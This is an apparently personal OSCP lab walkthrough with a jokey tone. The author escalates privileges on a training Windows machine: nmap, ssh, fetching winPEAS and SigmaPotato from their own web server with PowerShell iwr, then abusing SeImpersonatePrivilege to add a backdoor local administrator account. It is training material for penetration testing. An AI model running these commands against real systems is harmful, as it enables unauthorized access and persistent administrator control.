# OSCP-A Walkthrough

Okay we've been given creds to the .141 machine:

<img src="images/creds.png" style="border: 2px solid white"><br>

Let's run a quick portscan to figure out what's going on with this machine. For the time being, I don't care about services I just want to know what ports are open and I'll make assumptions - because time and time again I've proven <i>nothing</i> bad ever comes from making assumptions.

```nmap -T4 -Pn --open --top-ports 10000 192.168.233.141```

<img src="images/nmap.png" style="border: 2px solid white"><br>

Sweet! We have credentials and port 22 is open. Fair assumption, we can probably ssh.

```ssh eric.wallows@192.168.233.141```

<img src="images/ssh.png" style="border: 2px solid white"><br>

Now you may go straight for some common enumeration like `whoami /priv` or `net users` or something but I, a man of culture will waste so much time and instead use winPEAS. Why? Go away that's why.

Let's get winPEAS into the environment. (If you haven't already, <a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">go download it from here</a>)

And we'll use a Python web server to get the file into the target machine.

On your own machine:

```python3 -m http.server 80```

On your target machine, in <b>Powershell</b> (for those playing along at home change the IP address to your IP. I know it's easy to follow these guides and turn your brain off):

```iwr -uri http://192.168.45.157/winPEASx64.exe -Outfile winPEASx64.exe```

And behold:

<img src="images/iwr.png" style="border: 2px solid white"><br>

Why am I working out of the Downloads folder? Stop asking questions I am literally giving you answers. Be nice.

```.\winPEASx64.exe```

<img src="images/winpeas1.png" style="border: 2px solid white"><br>

Now we're looking for things in <span style="color: #ff0000">RED</span>.

Fun things like this! (Which I pray you never see in client systems but I guarantee you will... you really will...)

<img src="images/noav.png" style="border: 2px solid white"><br>

But what we're looking for are privilege escalation opportunities. The main ones taught through OSCP are:

- Service Binary Injections
- DLL Injections
- Unquoted Service Paths
- Excessive Privileges

If you're stuck with any of these or don't like the sound of them because they're technical and therefore scary, the course content covers them all:

<img src="images/winpriv.png" style="border: 2px solid white"><br>

And what you'll notice from winPEAS is that you can often be overloaded with information.

<img src="images/winpeas2.png" style="border: 2px solid white"><br>

<img src="images/dll.png" style="border: 2px solid white"><br>

<img src="images/winpeas3.png" style="border: 2px solid white"><br>

But what I'm most interested in isn't actually in <span style="color: #ff0000">RED</span>. It's this:

<img src="images/seimpersonate.png" style="border: 2px solid white"><br>

`SeImpersonatePrivilege`

Because just about every time you see this in a hacking challenge, it's what you're supposed to do. According to offsec:<br>

<i>"Non-privileged users with assigned privileges, such as SeImpersonatePrivilege, can potentially abuse those privileges to perform privilege escalation attacks."</i>

Now if you follow course content, they'll get you to use SigmaPotato. Where I've normally used JuicyPotato, I'm going to venture out and try following content for a change. I often find that using the exact tools Offsec teaches you yields better results in their labs.

So let's <a href="https://github.com/tylerdotrar/SigmaPotato/releases/">download SigmaPotato</a>.

And just as we did before, we'll use our Python server to bring it over to the target machine:

```iwr -uri http://192.168.45.157/SigmaPotato.exe -Outfile SigmaPotato.exe```

Theoretically, SigmaPotato should abuse `SeImpersonatePrivilege` to run commands as `NT Authority/SYSTEM`. Let's try it out:

```.\SigmaPotato "whoami"```

<img src="images/sigmafail.png" style="border: 2px solid white"><br>

Awesome, that returned nothing and I have no idea how this works. Let's just follow the content and try adding a user.

The format is `net user <username> <password> /add`

```.\SigmaPotato "net user notanaccountant password /add"```

Password is password come hack me.

<img src="images/sigma2.png" style="border: 2px solid white"><br>

Okay and the moment of truth:

```net user```

<img src="images/netuser.png" style="border: 2px solid white"><br>

Nice! It worked.

Let's go ahead and make the account a Local Administrator while we're at it:

```.\SigmaPotato "net localgroup Administrators notanaccountant /add"```

<img src="images/localadmin.png" style="border: 2px solid white"><br>

We're on fire. 

It's like when you score too many points in <a href="https://www.youtube.com/watch?v=jT5yh2HATEQ">2003's NBA Jam</a> for the PlayStation 2.

<img src="images/nbajam.png" style="border: 2px solid white"><br>


